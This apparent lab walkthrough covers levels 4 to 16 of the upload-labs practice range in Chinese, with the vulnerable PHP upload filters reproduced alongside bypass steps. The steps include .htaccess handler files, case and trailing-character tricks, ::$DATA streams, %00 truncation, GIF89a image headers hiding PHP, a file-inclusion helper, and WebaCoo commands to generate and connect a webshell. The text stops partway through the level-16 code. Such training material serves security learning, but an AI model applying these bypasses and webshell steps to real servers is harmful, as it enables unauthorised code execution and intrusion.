123456789101112131415161718192021222324$is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点 $file_ext &#x3D; strrchr($file_name, &#39;.&#39;); $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写 $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123; $img_path &#x3D; $UPLOAD_ADDR . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; &#39;此文件不允许上传!&#39;; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; 在桌面你新建一个one.txt，里面写入SetHandler application/x-httpd-php内容另存为.htaccess 页面进行上传，会返回一个空图片 复制图片链接，打开新的网址，会出现403，会显示 这说明你文件已经上传了，但是你没有权限去访问他 在上传一个图片，图片包含phpinfo探针 使用文本编写php代码 保存为1.jpg进行上传 复制图片地址在浏览器中打开 upload-labs第五关代码分析可以看到，此处的黑名单比Pass-04多了.htaccess，所有不能通过.htaccsess进行绕过了。但此处代码没有将文件名统一转成小写，可以通过大小写绕过 1234567891011121314151617181920212223$is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点 $file_ext &#x3D; strrchr($file_name, &#39;.&#39;); $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123; $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name; $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; &#39;此文件不允许上传&#39;; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; 绕过方法用burp将后缀改为大写PHP即可 放行查看页面 查看根目录 WebaCoo上传WebshellWebaCoo生成Webshell：webacoo -g -o a.php 上传Webshell 连接Webshell：webacoo -t -u Webshell地址 在kali中使用webacoo新建一个a.php文件 将文件复制到本地文件中，将后缀名改为大小写结合的PhP 上传复制会返回空白图片，复制图片连接，在另一个页面打开这个地址 复制这个地址去kali连接webshell，使用webacoo -t -u “URL”命令 注意：在URL中，因为是从本地copy到kali中的，本地的靶场是127.0.0.1，但在kali中没有127.0.0.1 1webacoo -t -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;upload-labs&#x2F;upload&#x2F;a.PhP&quot; 我们需要修改成本地地址打开cmd使用ipconfig查看当前地址，将127.0.0.1改为当前地址，出现这个页面就说明连接成功 使用ipconfig可以查看本地ip等等 upload-labs第六关代码分析可以看到，相比于上面Pass-05代码，这里将文件后缀名统一进行了小写转换，但是没有去除文件名首尾的空格。所以此处可以利用windows系统的命名规则进行绕过 1234567891011121314151617181920212223$is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点 $file_ext &#x3D; strrchr($file_name, &#39;.&#39;); $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写 $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123; $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name; $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; &#39;此文件不允许上传&#39;; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; 因为Windows特性所以不能在Windows下加空格，在kali中加入空格 进行上传，页面返回空白 查看根目录 upload-labs第七关代码分析从代码上看，可以发现相比于Pass-06代码，加上了首尾去空，但是却少了尾部去点。故和上面Pass-06一样，利用windows文件命名规则绕过。 1234567891011121314151617181920212223is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_ext &#x3D; strrchr($file_name, &#39;.&#39;); $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写 $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123; $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name; $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; &#39;此文件不允许上传&#39;; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; 在php后面加一个. 上传，并查看 查看根目录 upload-labs第八关代码分析可以看到，与前面第七关的代码相比，少了去除文件名的”::$DATA”字符串这一步。这里还是利用windows的一个特性。 1234567891011121314151617181920212223$is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点 $file_ext &#x3D; strrchr($file_name, &#39;.&#39;); $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写 $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123; $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name; $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; &#39;此文件不允许上传&#39;; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。 简单讲就是在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。 注:仅windows适用 更改文件名 上传 查看根目录 upload-labs第九关代码分析可以看到，这里代码的安全性比之前的都要更高，黑名单类型全，大小写经过转换，去除了文件名末尾的点，去除了文件名尾空格，还去除了::$DATA。。但是，这里还是可以绕过的。这里的代码逻辑是先删除文件名末尾的点，再进行首尾去空。都只进行一次。故可以构造点空格点进行绕过，也就是后缀名改为xx.php. .，也是利用了Windows的特性。 也就是说，如果从第三关到第九关，如果目标服务器是windows系统的话，均可用点空格点绕过。 123456789101112131415161718192021222324$is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点 $file_ext &#x3D; strrchr($file_name, &#39;.&#39;); $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写 $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123; $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name; $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; &#39;此文件不允许上传&#39;; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; 更改文件名 上传，返回空白图片 查看根目录 upload-labs第十关代码分析这里代码没有了之前关卡里的去除文件尾点、空格、::$DATA的操作，估计是针对非Windows系统的。这里存在的问题是，利用str_ireplace对黑名单里的文件后缀名进行了替换，换成空字符，使用了str_ireplace函数，即不区分大小写，故大小写绕过不适用。但是这里替换是替换成了空字符，于是我们可以双写后缀名，如.pphphp,使得替换后的后缀名为php。 12345678910111213141516$is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext &#x3D; array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name &#x3D; str_ireplace($deny_ext,&quot;&quot;, $file_name); if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name)) &#123; $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; .$file_name; $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; 更改文件后缀名 上传文件，返回空白图片 查看根目录 upload-labs第十一关代码分析这里与之前代码相比，使用了白名单，只允许上传，jpg，png，gif三种格式文件。 0x00是十六进制表示方法，是ascii码为0的字符，在有些和函数处理时，会把这个字符当做结束符 系统在对文件名的读取时，如果遇到0x00，就会认为读取已结束 date()随机数和rand()时间，以及最后添加文件扩展名$file_ext，这样就可以在date(“YmdHis”)后面加入0x00截断，使$file_ext被添加的文件后缀名不会被执行成功 1234567891011121314151617181920is_upload &#x3D; false;$msg &#x3D; null;if(isset($_POST[&#39;submit&#39;]))&#123; $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path &#x3D; $_GET[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload &#x3D; true; &#125; else&#123; $msg &#x3D; &#39;上传失败！&#39;; &#125; &#125; else&#123; $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125;&#125; 123截断条件： 1、php版本小于5.3.4 2、php.ini的magic_quotes_gpc为OFF状态 将其改为OFF状态 首先新建一个1.php的文件，将其里面写入一句话木马 写入一句话木马后，在将文件改名为1.jpg或者png只要是允许上传的文件格式就可以 进行上传，使用burp抓包，然后将burp中的信息进行稍微修改 修改完成后运行包通过，页面会返回空白图片，右击点击图片地址。 在新的页面将地址粘贴，粘贴完不能直接执行，需要将红线处的内容删除，也就是1.php后的内容删除，否则报错 删除之后在进入页面，返回phpinof的页面 这就是GTE截断。 upload-labs第十二关代码分析1234567891011121314151617181920$is_upload &#x3D; false;$msg &#x3D; null;if(isset($_POST[&#39;submit&#39;]))&#123; $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path &#x3D; $_POST[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload &#x3D; true; &#125; else&#123; $msg &#x3D; &quot;上传失败&quot;; &#125; &#125; else&#123; $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125;&#125; 在POST请求中，%00不会被自动解码，需要在16进制中进行修改00 创建一个php文件，写入一句话木马，然后更改为可上传格式，进行上传burp抓包 这里加入空格的原因是因为%00不会被自动解码，需要在16进制中修改，因为加入空格已知他是16进制的20，所以在HEX只需要找到位置将20修改为00就可以截断 这里代码与上面Pass-11代码类似，不过是save_path参数由GET传入变为POST传入，利用原理也是00截断 为了绕过类似的MIME Sniff的功能，常见的攻击技巧是伪造一个合法的文件头，而将真实的PHP等脚本代码附在合法的文件头之后 在HEX子模块中找到1.php空格，找到20 找到20之后，要将他修改为00 修改执行点击forward进行上传，返回一个空白图片，右键复制图片连接 在新的浏览器打开，当然还是需要将php格式后面的删除，成功访问 注意：截断需要关闭GPC否则会上传失败 upload-labs第十三关12345gif文件头表示GIF89apng文件头标识 (8 bytes) 89 50 4e 47 0d 0a 1a 0ajpg文件头标识 (2 bytes): ff, d8 代码分析这里代码意思是，将上传的文件读取先读取两字节，通过对比文件头来确认文件类型。 于是就可以制作图片马，将php语句隐藏在图片中，然后结合文件包含漏洞执行php。 1234567891011121314151617181920212223242526272829303132333435363738394041function getReailFileType($filename)&#123; $file &#x3D; fopen($filename, &quot;rb&quot;); $bin &#x3D; fread($file, 2); &#x2F;&#x2F;只读2字节 fclose($file); $strInfo &#x3D; @unpack(&quot;C2chars&quot;, $bin); $typeCode &#x3D; intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]); $fileType &#x3D; &#39;&#39;; switch($typeCode)&#123; case 255216: $fileType &#x3D; &#39;jpg&#39;; break; case 13780: $fileType &#x3D; &#39;png&#39;; break; case 7173: $fileType &#x3D; &#39;gif&#39;; break; default: $fileType &#x3D; &#39;unknown&#39;; &#125; return $fileType;&#125;$is_upload &#x3D; false;$msg &#x3D; null;if(isset($_POST[&#39;submit&#39;]))&#123; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $file_type &#x3D; getReailFileType($temp_file); if($file_type &#x3D;&#x3D; &#39;unknown&#39;)&#123; $msg &#x3D; &quot;文件未知，上传失败！&quot;; &#125;else&#123; $img_path &#x3D; $UPLOAD_ADDR.&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload &#x3D; true; &#125; else&#123; $msg &#x3D; &quot;上传失败&quot;; &#125; &#125;&#125; 从这一关开始上传图片马，结合文件包含进行攻击。 查看提示 绕过方法 服务端检测文件头，并将上传文件的后缀重命名为检测到的文件类型 关于服务端检测文件头，我们可以在文件起始加入jpg|png|gif文件的文件头来绕过 十进制转十六进制: gif为47 49 ， png为89 50， jpg为ff d8 关于文件上传后被重命名为图片文件，不能当做php解析，我们可以利用文件包含漏洞 这里使用GIF gif文件头为GIF89a 构造代码： 1234GIF89a&lt;?php phpinfo();?&gt; 将php改为jpg或者gif等能上传的格式，这里改为png 上传图片，页面返回空白 直接复制图片地址是会出错的 所以需要使用到文件包含漏洞 在upload下新建一个php文件 写入简单的提交页面 1234&lt;?php $file&#x3D;$_GET[&#39;ccc&#39;]; include($file);?&gt; 返回页面，复制图片地址，因为我们之前新建的php文件是c.php，提交内容是ccc，所以在页面中输入 1http:&#x2F;&#x2F;127.0.0.1&#x2F;upload-labs&#x2F;upload&#x2F;c.php?ccc&#x3D;图片名称 上传成功 upload-labs第十四关1234567想要提交那种文件就将文件头标识放到php文本开头gif文件头表示GIF89apng文件头标识 (8 bytes) 89 50 4e 47 0d 0a 1a 0ajpg文件头标识 (2 bytes): ff, d8 查看提示 代码分析getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。 getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。 1234567891011121314151617181920212223242526272829303132function isImage($filename)&#123; $types &#x3D; &#39;.jpeg|.png|.gif&#39;; if(file_exists($filename))&#123; $info &#x3D; getimagesize($filename); $ext &#x3D; image_type_to_extension($info[2]); if(stripos($types,$ext))&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload &#x3D; false;$msg &#x3D; null;if(isset($_POST[&#39;submit&#39;]))&#123; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $res &#x3D; isImage($temp_file); if(!$res)&#123; $msg &#x3D; &quot;文件未知，上传失败！&quot;; &#125;else&#123; $img_path &#x3D; $UPLOAD_ADDR.&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload &#x3D; true; &#125; else&#123; $msg &#x3D; &quot;上传失败&quot;; &#125; &#125;&#125; 和上一关相同，只是函数换了一个 upload-labs第十五关1234567想要提交那种文件就将文件头标识放到php文本开头gif文件头表示GIF89apng文件头标识 (8 bytes) 89 50 4e 47 0d 0a 1a 0ajpg文件头标识 (2 bytes): ff, d8 查看提示 代码分析这里使用了exif_imagetype()函数 exif_imagetype()函数是php内置函数，用来获取图片类型 123456789101112131415161718192021222324252627282930313233343536function isImage($filename)&#123; &#x2F;&#x2F;需要开启php_exif模块 $image_type &#x3D; exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return &quot;gif&quot;; break; case IMAGETYPE_JPEG: return &quot;jpg&quot;; break; case IMAGETYPE_PNG: return &quot;png&quot;; break; default: return false; break; &#125;&#125;$is_upload &#x3D; false;$msg &#x3D; null;if(isset($_POST[&#39;submit&#39;]))&#123; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $res &#x3D; isImage($temp_file); if(!$res)&#123; $msg &#x3D; &quot;文件未知，上传失败！&quot;; &#125;else&#123; $img_path &#x3D; $UPLOAD_ADDR.&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload &#x3D; true; &#125; else&#123; $msg &#x3D; &quot;上传失败&quot;; &#125; &#125;&#125; 和上一关一样 upload-labs第十六关查看提示 代码分析程序通过imagecreatefromjpeg()函数调用了PHP的GD库(GD库，是php处理图形的扩展库)，对图片进行了转换。 将一个正常显示的图片，上传到服务器。下载被渲染后与原始图片对比，在仍然相同的数据块部分插入WebShell代码，进行上传。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091$is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;]))&#123; &#x2F;&#x2F; 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $filetype &#x3D; $_FILES[&#39;upload_file&#39;][&#39;type&#39;]; $tmpname &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $target_path&#x3D;$UPLOAD_ADDR.basename($filename); &#x2F;&#x2F; 获得上传文件的扩展名 $fileext&#x3D; substr(strrchr($filename,&quot;.&quot;),1); &#x2F;&#x2F;判断文件后缀与类型，合法才进行上传操作 if(($fileext &#x3D;&#x3D; &quot;jpg&quot;) &amp;&amp; 